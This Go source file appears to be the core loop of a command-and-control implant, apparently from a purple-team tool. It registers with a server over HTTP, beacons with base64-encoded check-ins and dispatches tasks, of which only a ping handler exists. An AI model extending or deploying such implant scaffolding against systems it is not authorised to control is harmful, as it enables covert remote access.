package core

import (
	"encoding/base64"
	"purpcmd/internal"
	"time"
)

func Start() {
	i := ImplantInit()

	h := HTTPNew()
	h.HTTPSetSocket("0.0.0.0:4444")
	h.HTTPSetURL(false, "/")

	r := PackRegistration(i)

	p := base64.StdEncoding.EncodeToString(r)
	println(p)
	h.Post([]byte(p))

	for {
		data := PackCheck(i)
		dataP := base64.StdEncoding.EncodeToString(data)
		resp, err := h.Get([]byte(dataP))
		if err != nil {
			println(err.Error())
		}
		
		taskData := base64.NewDecoder(base64.StdEncoding, resp)
		tid, tcode, payload := PackParseTask(taskData)

		print("->",tcode)
		switch tcode {
		case internal.PING:
			println("\n->",tcode)
			responseTaskPayload := string(payload) + " pong"
			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)

			taskRestEnc := base64.StdEncoding.EncodeToString(taskResp)
			println(taskRestEnc)
			h.Post([]byte(taskRestEnc))
		default:
			print("->",tcode)
		}

		time.Sleep(time.Duration(i.Sleep) * time.Second)
	}
}